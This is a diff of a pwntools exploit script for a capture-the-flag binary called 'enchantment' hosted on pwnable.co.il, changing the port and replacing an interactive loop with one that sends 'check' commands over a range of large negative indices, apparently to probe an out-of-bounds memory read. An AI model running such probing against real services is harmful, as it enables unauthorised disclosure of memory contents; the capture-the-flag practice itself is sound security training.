@@ -5,7 +5,7 @@ from pwn import *
 exe = context.binary = ELF('./enchantment')
 
 host = args.HOST or 'pwnable.co.il'
-port = int(args.PORT or 9011)
+port = int(args.PORT or 9017)
 
 def start_local(argv=[], *a, **kw):
     '''Execute the target binary locally'''
@@ -36,16 +36,12 @@ continue
 # -- Exploit goes here --
 
 io = start()
-
 try:
-    while True:
-        print("> ", end="", flush=True)  # manually print prompt
-        inp = input().strip()
-        if inp in ("open", "close", "check"):
-            inp += " 0"
-        io.sendline(inp.encode())
+    for i in range(-5000, -30000, -1):
+        io.sendline((f"check {i}").encode())
         resp = io.recvuntil(b'>')
-        print(resp.decode().replace(">", "").strip())
+        print(resp, end=' ')
+        print(i)
 except (EOFError, KeyboardInterrupt):
     print("\nExiting...")
 
